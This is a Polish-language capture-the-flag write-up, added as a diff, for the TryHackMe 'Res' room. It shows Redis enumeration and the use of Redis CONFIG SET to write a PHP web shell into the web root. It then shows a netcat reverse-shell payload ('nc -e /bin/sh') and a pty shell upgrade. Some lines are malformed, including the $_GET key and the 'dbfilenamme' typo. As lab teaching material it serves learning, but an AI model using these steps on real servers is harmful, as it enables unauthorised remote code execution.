@@ -1,0 +1,47 @@
+Link: https://tryhackme.com/room/res
+Hack into a vulnerable database server with an in-memory data-structure
+
+/ RECON /
+Skan nmapem z którego dowiadujemy się jaki web server jest na stronie, czyli apache. 
+W source kodzie strony nic nie znajdujemy. 
+Ze skanu nmapem dowiadujemy się o naszym serwisie który jest bazą danych na porcie 6379. 
+
+Aby enumerować nasz serwis możemy użyć syntaxu:
+nmap --script redis-info -sV -p 6379 <IP>
+lub
+msf > use auxiliary/scanner/redis/redis_server
+
+
+POŁĄCZENIE Z SERWISEM
+
+Jeśli chcemy połączyć się z naszą bazą to najszybszą rzeczą będzie zrobienie tego za pomocą netcata:
+nc -v ip <port pod którym działa serwis>
+
+ALTERNATYWA (DŁUŻSZA)
+
+Aby zalogować się na do tej bazy danych musimy miec u siebie w systemie zainstalowane redis-toole, instalujemy to komendą: 
+sudo apt-get install redis-tools  
+
+Aby odpalić redisa:
+redis-cli -h [IP ADDRESS]
+
+Kiedy wpiszemy info dowiadujemy się wielu ciekawych informacji, m.in potencjalna nazwa użytkownika: vianka. 
+Z hack Tricks dowiadujemy się że możemy uzyskać RCE następująco, lecz musimy znać ścieżkę pliku strony internetowej (zazwyczaj jest w /var/www/html szczegolnie że webserver to apache)
+Dzięki temu możemy ustawić naszą własną bibliotekę, dać jej nazwe i ustalić co w niej będzie.
+Aby zobaczyć czy to działa dopisaliśmy prosty plik PHP do call phpinfo
+
+config set dir /var/www/html
+config set dbfilename redis.php
+set test "<?php phpinfo(); ?>"
+save
+
+DZIAŁA! Tym razem zamiast wywoływania phpinfo możemy wywołać system:
+config set dbfilenamme commandshell.php
+set test "<?php system($_GET['cmd=nc -e /bin/sh <IP> <PORT>']); ?>"
+save
+
+Tym sposobem mówimy systemowi aby w cmd wpisał podaną przez nas komendę, dzięki temu będziemy mogli na maszynie atakującej odpalić netcata i się z nią połączyć, nasłuchujemy połączeń:
+nc -lvnp <PORT>
+
+Kiedy połączenie zakończy się powodzeniem spawnimy shell:
+python -c 'import pty;pty.spawn("/bin/sh")'
